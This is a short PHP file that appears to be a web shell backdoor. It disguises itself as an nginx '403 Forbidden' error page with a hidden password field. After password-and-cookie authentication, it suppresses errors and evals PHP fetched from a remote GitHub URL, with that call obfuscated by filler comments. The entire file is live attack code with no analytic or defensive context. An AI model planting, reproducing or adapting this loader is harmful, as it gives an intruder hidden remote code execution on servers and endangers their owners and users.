<?php
$auth_pass = "b713c03bc5f0632a8172292ef537befce70bdbe3846e8e5fa80a8c6339ccbc98";

function Login() {
  die("<html>
  <title>403 Forbidden</title>
  <center><h1>403 Forbidden</h1></center>
  <hr><center>nginx (You don't have permission access to server / on this server) </center>
  <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if (!empty($auth_pass)) {
    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
?>
<?=/****/@/*54134*/null; /******/@/*54134*/error_reporting(0);/****/@/*54134*/null; /******/@/*54134*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/soy777/gg/main/class.php"))/******/ /*By ./Mr403Forbidden*/?>
